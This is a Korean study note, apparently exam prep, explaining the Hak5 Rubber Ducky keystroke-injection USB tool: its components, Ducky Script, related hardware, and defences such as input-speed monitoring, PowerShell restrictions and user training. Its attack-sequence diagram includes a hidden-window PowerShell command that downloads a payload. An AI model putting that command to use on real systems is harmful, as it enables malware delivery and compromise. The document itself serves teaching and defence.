## 핵심 인사이트 (3줄 요약)
1. **본질**: 일반적인 USB 메모리 외형을 가졌으나 내부적으로는 프로그래밍 가능한 키보드로 동작하여, 미리 설정된 악성 스크립트를 초고속으로 자동 입력하는 침투 테스트용 도구다.
2. **가치**: 10년 넘게 'BadUSB' 공격의 대명사로 군림하며, 보안 솔루션이 파일을 검사할 때 '입력'으로 공격하는 비대칭적 침투 경로를 전 세계에 증명했다.
3. **판단 포인트**: 기술적 세련미보다는 사회 공학적 허점과 입력 장치에 대한 무조건적 신뢰를 파고들기 때문에, 사용자 교육과 함께 인터랙티브 로그인 보안 강화가 주효한 대응책이다.

---

## Ⅰ. 개요 및 필요성

Rubber Ducky(러버 덕키)는 보안 연구소인 Hak5에서 개발한 대표적인 HID(Human Interface Device) 공격 도구다. 겉모습은 평범한 USB 드라이브와 똑같아 누구도 경계하지 않지만, 컴퓨터에 꽂는 순간 초당 1,000단어 이상의 속도로 명령어를 타이핑하는 '고스트 키보드'로 변신한다.

이 도구가 필요한 이유는 침투 테스터가 타겟 시스템의 터미널에 직접 앉아 명령을 치는 시간을 극단적으로 줄여주기 때문이다. 단 1~2초의 물리적 접근만으로도 리버스 쉘(Reverse Shell)을 열거나 정보를 탈취할 수 있어, 물리적 보안의 허점을 실증하는 데 최적의 도구로 활용된다.

- **📢 섹션 요약 비유**: Rubber Ducky는 겉은 얌전한 양(USB 메모리)인데 속은 늑대(해커의 키보드)인 '트로이의 목마'와 같다.

---

## Ⅱ. 아키텍처 및 핵심 원리

Rubber Ducky는 단순한 구조 속에 강력한 기능을 담고 있다.

| 구성 요소 | 역할 | 상세 |
|:---|:---|:---|
| **MicroSD 카드** | 페이로드 저장소 | 실행할 스크립트(inject.bin) 저장 |
| **ATMEL CPU** | 스크립트 실행기 | 스크립트를 읽어 USB HID 신호로 변환 |
| **Ducky Script** | 전용 스크립트 언어 | `STRING`, `DELAY`, `GUI r` 등 직관적 명령 사용 |
| **USB Controller** | HID 인터페이스 | OS에 표준 USB 키보드로 식별됨 |

```text
[ Rubber Ducky Attack Sequence ]
1. Plugin -> 2. OS Recognizes "Generic HID Keyboard"
3. Rubber Ducky Reads 'inject.bin' from MicroSD
4. Rubber Ducky Emulates Keypresses:
   - [GUI + R] (Run Dialog)
   - [STRING] "powershell -w hidden -c (New-Object Net.WebClient).DownloadFile(...)"
   - [ENTER]
5. Malware Executed / System Compromised
```

최신 버전(Duckey Script 3.0)은 조건문, 변수, 하드웨어 지문 인식 우회 기능까지 포함하여 더욱 지능적인 공격이 가능해졌다.

- **📢 섹션 요약 비유**: 악보(Ducky Script)를 보고 피아노(키보드 신호)를 자동으로 연주하는 '자동 연주 피아노'가 USB 속에 들어있는 셈이다.

## Ⅲ. 비교 및 연결

Rubber Ducky는 하드웨어 침투 도구 생태계에서 기준점 역할을 한다.

| 비교 항목 | Rubber Ducky | Bash Bunny | Digispark (Attiny85) |
|:---|:---|:---|:---|
| **플랫폼** | 전용 펌웨어 기반 | 임베디드 리눅스 기반 | 오픈소스 아두이노 기반 |
| **기능** | 순수 HID 공격 특화 | 복합 공격 (HID+NIC+Storage) | 저가형 DIY HID 공격 |
| **준비 속도** | 즉시 실행 (초단위) | 부팅 시간 필요 (10~15초) | 즉시 실행 |
| **가격/휴대성** | 중간 / 최상 (USB 외형) | 높음 / 보통 (부피가 큼) | 매우 낮음 / 상 (칩 형태) |

Rubber Ducky의 공격은 **Social Engineering**과 결합될 때 가장 치명적이다. "급히 인쇄할 게 있는데 이것 좀 꽂아주세요"라는 부탁 한 번에 사내망 전체가 마비될 수 있다.

- **📢 섹션 요약 비유**: Rubber Ducky가 '한 발의 정밀 저격총'이라면, Bash Bunny는 '다양한 무기가 든 군장'이다.

## Ⅳ. 실무 적용 및 기술사 판단

실무 현장에서 Rubber Ducky 공격을 직접 경험하면 보안 의식이 획기적으로 개선된다.

### 대응 전략 및 판단
1. **입력 속도 감시**: 사람이 도저히 칠 수 없는 속도로 명령어가 입력되면 포트를 차단하는 EDR 솔루션을 고려한다.
2. **스크립트 실행 제한**: PowerShell의 `Constrained Language Mode`나 실행 정책(`ExecutionPolicy`)을 강화하여 자동 주입된 스크립트의 실행을 막는다.
3. **사용자 교육**: "길거리에 떨어진 USB는 폭탄과 같다"는 인식을 심어주는 'Lost USB' 테스트를 정기적으로 수행한다.
4. **MFA 필수화**: 중요한 명령 실행 시 반드시 별도의 모바일 인증이나 생체 인증을 거치게 설계한다.

### 기술사 판단
"Rubber Ducky는 보안의 '가시성' 문제를 꼬집는다. 대부분의 보안 장비는 '무엇이 들어왔나(파일)'를 보지만, Rubber Ducky는 '무엇을 하나(행위)'를 봐야만 막을 수 있다. 따라서 엔드포인트 보안은 파일 기반 검사를 넘어, 입력 장치의 컨텍스트와 시스템 호출(Syscall)의 의도를 분석하는 방향으로 고도화되어야 한다."

- **📢 섹션 요약 비유**: 낯선 사람이 건네는 물건은 일단 의심하고, 집 안(시스템)에 들어와서 하는 행동을 끝까지 지켜봐야 한다.

---

## Ⅴ. 기대효과 및 결론

Rubber Ducky에 대한 방어력을 갖추는 것은 현대 보안 아키텍처의 필수 관문이다. 이를 통해 '편의성'과 '보안' 사이의 타협점이 어디에 있는지를 명확히 할 수 있으며, 직원의 보안 인식을 실질적으로 높일 수 있다.

결론적으로 Rubber Ducky는 단순한 해킹 도구를 넘어, 우리 시스템의 신뢰 모델이 얼마나 취약한지를 일깨워주는 '보안의 스승'과 같은 존재다.

- **📢 섹션 요약 비유**: Rubber Ducky는 보안의 틈새를 찾아내는 '돋보기'다. 그 틈새를 메우는 것이 진정한 보안의 시작이다.

### 👶 어린이를 위한 3줄 비유 설명
1. 겉모습은 평범한 USB지만, 속에는 아주 빠른 속도로 타이핑을 하는 '투명 인간'이 살고 있어요.
2. 컴퓨터에 꽂는 순간 이 투명 인간이 해커의 명령어를 순식간에 입력해서 컴퓨터를 고장 낼 수 있어요.
3. 그래서 길에서 주운 USB나 모르는 사람이 준 USB는 절대로 컴퓨터에 꽂으면 안 된답니다!
